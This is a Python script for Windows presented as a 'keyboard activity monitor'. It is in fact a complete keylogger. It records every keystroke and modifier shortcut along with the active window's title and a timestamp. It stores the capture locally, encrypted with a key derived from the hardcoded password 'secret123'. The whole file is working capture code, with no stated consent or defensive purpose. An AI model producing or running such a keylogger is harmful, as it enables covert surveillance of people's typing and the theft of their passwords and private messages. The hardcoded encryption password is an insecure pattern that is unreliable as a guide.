from pynput import keyboard
from datetime import datetime, timedelta
import win32gui
from cryptography.fernet import Fernet
import base64
import hashlib
import os
import sys

# Base directory for storing logs
base_path = r"D:\Keyboard_Activity_Monitor"
os.makedirs(base_path, exist_ok=True)

# File paths and encryption settings
log_file = os.path.join(base_path, "keystrokes.enc")
password = "secret123"

# Tracking variables
last_timestamp = datetime.now()
last_window = None
pressed_modifiers = set()
session_buffer = ""

# -------- Encryption Helpers --------
def get_active_window_title():
    try:
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except:
        return "Unknown Window"

def get_encryption_key(password):
    digest = hashlib.sha256(password.encode()).digest()
    return base64.urlsafe_b64encode(digest)

def encrypt_message(message):
    key = get_encryption_key(password)
    fernet = Fernet(key)
    return fernet.encrypt(message.encode())

def flush_session_buffer():
    global session_buffer
    if session_buffer:
        lines = session_buffer.strip().splitlines()
        merged = ""
        for line in lines:
            if line.startswith("--- Window:"):
                if merged:
                    merged += "\n"
                merged += line + "\n"
            else:
                merged += line.strip() + " "
        merged = merged.strip() + "\n"

        encrypted = encrypt_message(merged)
        with open(log_file, "ab") as f:
            f.write(encrypted + b'\n')
        session_buffer = ""

# -------- Keyboard Hooks --------
def on_press(key):
    global last_timestamp, last_window, pressed_modifiers, session_buffer

    current_time = datetime.now()
    current_window = get_active_window_title()

    if (current_time - last_timestamp >= timedelta(minutes=30)) or (current_window != last_window):
        flush_session_buffer()
        last_timestamp = current_time
        last_window = current_window
        session_time = last_timestamp.strftime('%Y-%m-%d %H:%M:%S')
        session_buffer += f"\n\n--- Window: {current_window} | {session_time} ---\n"

    if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
        pressed_modifiers.add('Ctrl')
        return
    elif key in [keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r]:
        pressed_modifiers.add('Shift')
        return
    elif key in [keyboard.Key.alt_l, keyboard.Key.alt_r]:
        pressed_modifiers.add('Alt')
        return

    try:
        key_text = key.char
        control_map = {
            '\x01': '[Ctrl+A]',
            '\x03': '[Ctrl+C]',
            '\x16': '[Ctrl+V]',
            '\x18': '[Ctrl+X]',
            '\x1A': '[Ctrl+Z]',
            '\x19': '[Ctrl+Y]',
            '\x06': '[Ctrl+F]',
            '\x05': '[Ctrl+E]',
            '\x0E': '[Ctrl+N]',
            '\x0D': '[Ctrl+M]',
            '\x0C': '[Ctrl+L]',
            '\x0B': '[Ctrl+K]',
            '\x13': '[Ctrl+S]',
            '\x10': '[Ctrl+P]',
            '\x14': '[Ctrl+T]',
            '\x12': '[Ctrl+R]',
            '\x17': '[Ctrl+W]',
            '\x0F': '[Ctrl+O]'
        }
        if pressed_modifiers:
            session_buffer += control_map.get(key_text, f"[{' + '.join(pressed_modifiers)}+{key_text.upper()}]")
        else:
            session_buffer += key_text

    except AttributeError:
        special_keys = {
            keyboard.Key.space: "[SPACE]",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.delete: "[DEL]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]"
        }
        session_buffer += special_keys.get(key, f"[{str(key).replace('Key.', '').upper()}]")

def on_release(key):
    global pressed_modifiers
    if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
        pressed_modifiers.discard('Ctrl')
    elif key in [keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r]:
        pressed_modifiers.discard('Shift')
    elif key in [keyboard.Key.alt_l, keyboard.Key.alt_r]:
        pressed_modifiers.discard('Alt')

# -------- Main Entry --------
if __name__ == "__main__":
    # Add NEW SESSION marker at startup
    session_start = "\n===============NEW SESSION===========\n"
    encrypted_start = encrypt_message(session_start)
    with open(log_file, "ab") as f:
        f.write(encrypted_start + b'\n')

    # Add first window header
    last_window = get_active_window_title()
    session_time = last_timestamp.strftime('%Y-%m-%d %H:%M:%S')
    session_buffer += f"\n\n--- Window: {last_window} | {session_time} ---\n"

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
